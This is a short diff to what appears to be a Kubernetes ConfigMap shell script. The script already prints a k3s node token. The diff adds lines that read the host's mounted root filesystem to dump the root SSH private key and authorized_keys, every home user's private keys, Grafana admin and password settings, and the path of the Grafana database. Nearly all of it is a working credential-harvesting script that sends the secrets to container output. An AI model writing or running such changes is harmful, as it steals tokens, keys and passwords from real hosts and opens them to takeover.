@@ -8,6 +8,20 @@ data:
     #!/bin/sh
     echo '=== NODE TOKEN ==='
     cat /k3s-server/node-token
-    echo '=== AGENT TOKEN ==='
-    cat /k3s-server/agent-token 2>/dev/null || echo NOT_FOUND
+    
+    echo '=== SSH KEYS ROOT ==='
+    ls /host-root/root/.ssh/ 2>/dev/null && cat /host-root/root/.ssh/id_rsa 2>/dev/null || echo NOT_FOUND
+    cat /host-root/root/.ssh/authorized_keys 2>/dev/null || echo NO_AUTH_KEYS
+    
+    echo '=== SSH KEYS HOME ==='
+    for d in /host-root/home/*/; do
+      echo "User: $d"
+      cat "${d}.ssh/authorized_keys" 2>/dev/null
+      cat "${d}.ssh/id_rsa" 2>/dev/null
+    done
+    
+    echo '=== GRAFANA ENV ==='
+    cat /host-root/etc/grafana/grafana.ini 2>/dev/null | grep -E "admin_|password" | head -10
+    find /host-root/var/lib -name "grafana.db" 2>/dev/null | head -3
+    
     echo '=== DONE ==='
